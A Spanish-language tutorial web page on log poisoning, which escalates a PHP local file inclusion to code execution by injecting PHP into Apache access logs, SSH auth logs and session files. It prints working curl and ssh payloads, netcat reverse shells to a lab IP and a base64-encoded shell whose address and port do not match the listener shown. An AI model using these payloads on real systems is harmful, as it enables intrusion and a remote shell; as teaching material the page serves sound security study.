@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="es-ES">
+     <head>
+  	<title>LP</title>
+    	<meta charset="utf-8">
+    	<link rel="icon" type="image/png" href="../../img/logo.png" />
+        <link rel="stylesheet" href="../decoration/style.css"/>
+     </head>
+
+  	<body>
+      	<div class="cuerpo">
+        	<div class="contenido">
+  		        <h1 align="center">Log Poisoning</h1><br><br>
+  		        <p>Antes de centrarnos en una técnica como el <strong>Log Poisoning</strong>, debemos conocer todo aquello que engloba el <a href="./../lfi/LocalFileInclusion.html"><i><strong>Local File Inclusion</strong></i></a>.</p><br>
+
+              	<p><strong>Log Poisoning</strong> es una técnica que permite a un atacante conseguir ejecución remota de comandos a través de un LFI.</p><br>
+
+              	<p>Para ello, un atacante debe encontrar recursos de log visibles para él de los cuales pueda aprovecharse alterando su contenido.</p><br>
+
+              	<p>Un archivo interesante sería <strong><big>/var/log/apache2/access.log</big></strong>, el cual muestra los accesos al sitio web, si pudiéramos ver dicho contenido, podremos inyectar código php en el User-Agent y al volver a visualizar dicho archivo, vería el código php interpretado<br><br>
+      			<ins>Contenido del archivo:</ins></p><br>
+
+      			<pre rel="contenido"><code>192.168.1.22 - - [30/Dec/2020:23:28:35 +0100] "GET / HTTP/1.1" 200 3477 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+192.168.1.22 - - [30/Dec/2020:23:28:36 +0100] "GET /icons/ubuntu-logo.png HTTP/1.1" 200 3623 "http://192.168.1.150/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+192.168.1.22 - - [30/Dec/2020:23:28:36 +0100] "GET /favicon.ico HTTP/1.1" 404 491 "http://192.168.1.150/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+192.168.1.22 - - [30/Dec/2020:23:28:48 +0100] "GET /index.php HTTP/1.1" 200 220 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+192.168.1.22 - - [30/Dec/2020:23:29:01 +0100] "GET /index.php?page=/etc/passwd HTTP/1.1" 200 1282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+192.168.1.22 - - [30/Dec/2020:23:29:18 +0100] "GET /index.php?page=/var/log/apache2/access.log HTTP/1.1" 200 563 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"</code></pre><br>
+            
+              	<p>El atacante se aprovecha de que puede ver todas las peticiones que se hacen al sitio web para cambiar el User-Agent, por un código php. El cual se ejecutará y mostrará el resultado sustituyendo el User-Agent original</p><br>
+
+              	<p>En el apartado de Local File Inclcusion hemos mencionado la herramienta Burp Suite para alterar el User-Agent, esta vez vamos a utilizar el comando <strong>curl</strong> para modificarlo.<br>
+                Lo haremos de la siguiente forma.</p><br>
+
+              	<pre rel="terminal"><code><font size="3" color="red">~$</font> curl -X GET "http://192.168.1.150/index.php?page=/var/log/apache2/access.log" -H "User-Agent: &lt?php system('whoami'); ?&gt"</code></pre><br>
+
+              	<p>Al ejecutar curl, se enviará la nueva petición cuyo User-Agent será el código php interpretado por el servidor. Si después volvemos a visualizar el archivo access.log veremos algo como esto:</p><br>
+
+              	<pre rel="contenido"><code>192.168.1.22 - - [30/Dec/2020:23:43:36 +0100] "GET /index.php?page=/var/log/apache2/access.log HTTP/1.1" 200 1789 "-" "www-data"</code></pre><br>
+      				
+              	<p>Aprovechando esto, podríamos abrirnos una reverse shell. Aquí se muestran los pasos:<br><br>
+              Lo primero un atacante expone un puerto de su máquina donde recibirá la conexión por netcat.</p><br>
+
+              	<pre rel="terminal"><code><font size="3" color="red">~$</font> nc -lnvp 9999</code></pre><br>
+
+              	<p>Y lanzará la petición al servidor envenenando el User-Agent:</p><br>
+
+              	<pre rel="terminal"><code><font size="3" color="red">~$</font> curl -X GET "http://192.168.1.150/index.php?page=/var/log/apache2/access.log" -H "User-Agent: &lt?php system('nc 192.168.1.22 9999 -e /bin/bash'); ?&gt"</code></pre><br>
+
+              	<p>Lanzado esto, la terminal que ha puesto en escucha recivirá la conexión y nos devolverá el prompt, esto es una señal de que ya tenemos abierta una reverse shell contra el servidor.</p><br><br>
+
+              	<p>Otro archivo interesante sería <strong><big>/var/log/auth.log</big></strong>, en este archivo se almacenan las autenticaciones sobre el sistema, incluidas las de SSH.</p><br>
+
+              	<p>Si mediante el servicio ssh un atacante intenta loggearse al sistema y posteriormente visualizar el contenido de dicho archivo, este verá los intentos de loggueo que se han realizado en el sistema, incluidos los que ha realizado él.</p><br>
+
+              	<pre rel="contenido"><code>Jan  1 18:19:48 ubuntuLinux sshd[2988]: Invalid user juan from 192.168.1.22 port 56213
+Jan  1 18:19:53 ubuntuLinux sshd[2988]: pam_unix(sshd:auth): check pass; user unknown
+Jan  1 18:19:53 ubuntuLinux sshd[2988]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.22 
+Jan  1 18:19:55 ubuntuLinux sshd[2988]: Failed password for invalid user juan from 192.168.1.22 port 56213 ssh2
+Jan  1 18:19:57 ubuntuLinux sshd[2988]: Connection reset by invalid user juan 192.168.1.22 port 56213 [preauth]
+Jan  1 18:20:28 ubuntuLinux sshd[2990]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.22  user=david
+Jan  1 18:20:30 ubuntuLinux sshd[2990]: Failed password for david from 192.168.1.22 port 56214 ssh2</code></pre><br>
+
+              	<p>La vulnerabilidad empieza cuando un atacante inyecta código php en el campo correspondiente al usuario. Realizando una autenticación al sistema, en este caso el atacante se aprovechará de el servicio ssh que corre en la máquina victima:</p><br>
+
+              	<pre rel="terminal"><code><font size="3" color="red">~$</font> ssh "&lt?php system('id'); ?&gt@192.168.1.150"</code></pre><br>
+
+              	<p>Esto provocará que la respuesta del servidor el usuario sea el código php ejecutado. El resultado que devuelve sería este:</p><br>
+
+              	<pre rel="contenido"><code>Jan 1 18:31:47 ubuntuLinux sshd[3102]: Invalid user uid=33(www-data) gid=33(www-data) groups=33(www-data),998(docker) from 192.168.1.22 port 56236</code></pre><br>
+
+              	<p>Para abrir una reverse shell en este caso sería un poco más complicado, el atacante pondría un puerto a la escucha donde recibirá conexión.</p><br>
+
+              	<pre rel="terminal"><code><font size="3" color="red">~$</font> nc -lvnp 4444</code></pre><br>
+
+              	<p>Tras esto se dispondrá a logguearse y cuyo usuario sería el código php malicioso con el que se obtendrá una shell del sistema víctima. ¡¡Pero <strong style="color:red;">CUIDADO!!</strong>.<br><br>
+              Este archivo es muy sensible y al ejecutar este comando:</p><br>
+
+              	<pre rel="terminal"><code><font size="3" color="red">~$</font> ssh "&lt?php system('nc 192.168.1.22 4444 -e /bin/bash'); ?&gt@192.168.1.150"</code></pre><br>
+
+              	<p>La "/" provocará un fallo en el archivo auth.log, provocando la inutilización de este e impidiendo su visualización, anulando así la posibilidad de que un atacante logré abrirse una reverse shell contra el sistema víctima.</p><br>
+
+              	<p>Para bypassear esto podemos codificar en base64 el comando. Quedando de esta manera:</p><br>
+
+              	<pre rel="terminal"><code><font size="3" color="red">~$</font> ssh "&lt?php system(base64_decode('bmMgMTkyLjE2OC4xLjEzNiA2NjY2IC1lIC9iaW4vYmFzaA==')); ?&gt@192.168.1.150"</code></pre><br>
+
+              	<p>Tras ejecutar este comando y visualizar este archivo desde el navegador, veremos que no deja de cargar la web.</p><br>
+
+              	<pre rel="url"><code>http://192.168.1.150/index.php?page=/var/log/auth.log</code></pre><br>
+
+              	<p>Y comprobaremos que en el puerto que hemos puesto a la escucha ha recibido una conexión. Ya tendremos una shell interactiva del equipo víctima</p><br>
+
+              	<p>Otros archivos interesantes serían <strong>/var/log/apache2/error.log</strong>, <strong>/var/log/nginx/access.log</strong>, <strong>/var/log/sshd.log</strong>, <strong>/var/log/mail</strong>, y <strong>/var/log/vsftpd.log</strong></p><br>
+
+              	<h4>Sesiones</h4><br>
+
+              	<p>Además de los recursos de registro (logs), también podremos conseguir RCE a través de las sesiones, debemos saber que PHP guarda las sesiones en el disco, en windows en "C:\Windows\Temp" y en Linux en "/var/lib/php/sessions/". El nombre del archivo de sesión se puede identificar a partir de la PHPSESSID, esto es una cookie de del servidor web. Un ejemplo del archivo que genená sería "<strong>/var/lib/php/sessions/sess_el3t2v0kqbvdfgy5krt2hscpl44</strong>".</p><br>
+
+              	<p>La PHPSESSID la podemos visualizar desde el propio navegador, desde inspeccionar elemento, en la pestaña network, al recargar la página, podemos ver las cabeceras donde aparecerá esa cookie y toda la demás información que se tramita.</p><br>
+
+              	<p>La vulnerabilidad consiste en la visualización de estos archivos que se generarían con el nombre de la PHPSESSID. Se haría a través de un LFI de esta manera:</p><br>
+
+              	<pre rel="url"><code>http://192.168.1.150/index.php?page=/var/lib/php/sessions/sess_5psbaniupl4k98nm6a1qi8flv7</code></pre><br>
+
+              	<p>Obteniendo este resultado:</p><br>
+
+              	<pre rel="contenido"><code>page|s:6:"File1.php";preference|s:7:"File";</code></pre><br>
+
+              	<p>En el resultado podemos ver el ultimo archivo que se ha visualizado mediante el parámetro "page", en este caso se a visualizado un archivo denominado "File1.php".</p><br>
+
+              	<p>Esto se puede explotar inyectando código php en el parámetro page. Veamos aquí un ejemplo:</p><br>
+
+              	<pre rel="url"><code>http://192.168.1.150/index.php?page=&lt?php system('id'); ?&gt</code></pre><br>
+
+              	<p>Esto provocará que el registro que se crea almacene como ruta el código php ejecutado a nivel de sistema y al visualizar el archivo de nuevo.</p><br>
+
+              	<pre rel="url"><code>http://192.168.1.150/index.php?page=/var/lib/php/sessions/sess_5psbaniupl4k98nm6a1qi8flv7</code></pre><br>
+
+             	<p>Veremos este contenido:</p><br>
+
+              	<pre rel="contenido"><code>page|s:22:"uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm) ";preference|s:7:"File";</code></pre>
+        	</div>
+    	</div>
+    	<footer>
+      		<marquee>Log Poisoning</marquee>
+    	</footer>
+  	</body>
+</html>
